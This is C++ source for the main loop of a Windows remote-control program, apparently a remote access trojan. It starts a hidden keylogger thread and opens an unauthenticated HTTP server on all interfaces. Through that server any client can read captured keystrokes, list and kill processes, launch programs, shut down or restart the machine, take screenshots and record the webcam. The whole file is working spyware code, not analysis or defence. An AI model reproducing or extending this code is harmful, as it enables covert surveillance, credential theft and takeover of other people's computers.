#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include "config.h"
#include "http_utils.h"
#include "router.h"
#include "apps.h"
#include "processes.h"
#include "keylogger.h"
#include "webcam.h"
#include "system.h"

int main() {
    
    std::thread loggerThread(StartKeyloggerThread);
    loggerThread.detach();


    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    bind(server_fd, (sockaddr*)&address, sizeof(address));
    listen(server_fd, 5);

    std::cout << "Server running on port " << PORT << "...\n";
    std::cout << "Keylogger is active in background...\n";

    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) continue;

        char buffer[BUFFER_SIZE] = {0};
        recv(client_socket, buffer, BUFFER_SIZE, 0);
        
        std::string request(buffer);
        // Lấy dòng đầu tiên: GET /path HTTP/1.1
        std::stringstream ss(request);
        std::string method, full_path;
        ss >> method >> full_path;

        if (method.empty()) {
            closesocket(client_socket);
            continue;
        }

        std::string route = get_route_path(full_path);
        std::map<std::string, std::string> query = parse_query(full_path);
        std::string response;

        std::cout << "Request: " << route << std::endl;

        // --- ROUTER ---
        if (route == "/ping") {
            response = http_response("pong");
        }
        else if (route == "/apps") {
            response = list_apps();
        }
        else if (route == "/apps/start") {
            std::string name = query["name"];
            if (APPS.count(name)) start_app_sys(APPS[name]);
            else start_app_sys(name); // Thử mở trực tiếp nếu không có trong dict
            response = http_response("Started " + name);
        }
        else if (route == "/apps/stop") {
            // Logic dừng app theo tên định nghĩa trong APPS
            std::string name = query["name"];
            if (APPS.count(name)) stop_process_sys(APPS[name]);
            else stop_process_sys(name + ".exe");
            response = http_response("Stopped " + name);
        }
        else if (route == "/processes") {
            response = list_processes();
        }
        else if (route == "/processes/stop") {
            // Nhận PID hoặc tên
            std::string target = query["name"]; // Dùng param 'name' cho thống nhất
            stop_process_sys(target); 
            response = http_response("Kill command sent to " + target);
        }
        else if (route == "/keylogger/send") {
            response = keylog_append(query["key"]);
        }
        else if (route == "/keylogger/get") {
            response = http_response(KEY_LOG_BUFFER);
        }
        else if (route == "/shutdown") {
            response = system_control("shutdown");
        }
        else if (route == "/restart") {
            response = system_control("restart");
        }

        else if (route == "/screenshot") {
            std::string filename = take_screenshot();
            response = http_response("Screenshot saved as: " + filename);
        }

        // --- ROUTE QUAY WEBCAM ---
        else if (route == "/webcam") {
            int duration = 10;
            if (query.find("duration") != query.end()) {
                try { duration = std::stoi(query["duration"]); } catch(...) {}
            }

            std::cout << "Recording webcam for " << duration << "s..." << std::endl;
            std::string filename = start_webcam_recording(duration);
            response = http_response("Started recording webcam. File: " + filename);
        }


        else {
            response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
        }

        send(client_socket, response.c_str(), response.length(), 0);
        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}